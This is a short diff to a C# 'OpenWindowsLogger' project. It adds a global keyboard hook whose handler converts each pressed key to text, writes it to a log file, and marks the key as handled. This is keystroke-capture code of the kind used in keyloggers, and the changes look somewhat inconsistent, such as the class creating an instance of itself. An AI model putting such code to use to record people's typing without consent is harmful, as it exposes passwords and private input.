@@ -30,7 +30,26 @@ namespace OpenWindowsLogger
   //Based on https://gist.github.com/Stasonix
   class GlobalKeyboardHook : IDisposable
   {
-    public event EventHandler<GlobalKeyboardHookEventArgs> KeyboardPressed;
+    private event EventHandler<GlobalKeyboardHookEventArgs> KeyboardPressed;
+    private GlobalKeyboardHook _globalKeyboardHook;
+    KeysConverter kc = new KeysConverter();
+
+    public void keyListenerMain()
+    {
+      _globalKeyboardHook = new GlobalKeyboardHook();
+      _globalKeyboardHook.KeyboardPressed += OnKeyPressed;
+    }
+
+    private void OnKeyPressed(object sender, GlobalKeyboardHookEventArgs e)
+    {
+      if (e.KeyboardState == GlobalKeyboardHook.KeyboardState.KeyDown)
+      {
+        string key = kc.ConvertToString(e.KeyboardData.VirtualCode);
+        //MessageBox.Show(key);
+        OpenWindowsLogger.OWLmain.log.rwlog("w", "/PRESSED/" + key);
+        e.Handled = true;
+      }
+    }
 
     public GlobalKeyboardHook()
     {
